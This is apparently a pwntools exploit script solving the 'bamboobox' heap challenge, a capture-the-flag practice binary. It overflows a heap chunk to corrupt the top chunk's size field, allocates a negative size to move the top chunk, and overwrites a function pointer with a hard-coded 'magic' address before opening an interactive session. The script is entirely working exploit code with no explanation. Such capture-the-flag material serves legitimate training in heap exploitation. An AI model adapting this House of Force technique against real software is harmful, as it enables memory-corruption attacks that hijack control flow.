#!/usr/bin/env python
from pwn import *

r = process("./bamboobox")

def ad(size,name):
        r.recvuntil(":")
        r.sendline("2")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(name)

def show():
        r.recvuntil(":")
        r.sendline("1")

def change(index,size,name):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(index))
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(name)

def rm(index):
        r.recvuntil(":")
        r.sendline("4")
        r.recvuntil(":")
        r.sendline(str(index))

magic = 0x0000000000400d49
ad(0x40,"ddaa")
change(0,0x50,"a"*0x40+p64(0)+p64(0xffffffffffffffff))
ad(-0x80,"ddaa")
ad(0x20,p64(0)+p64(magic))
r.interactive()
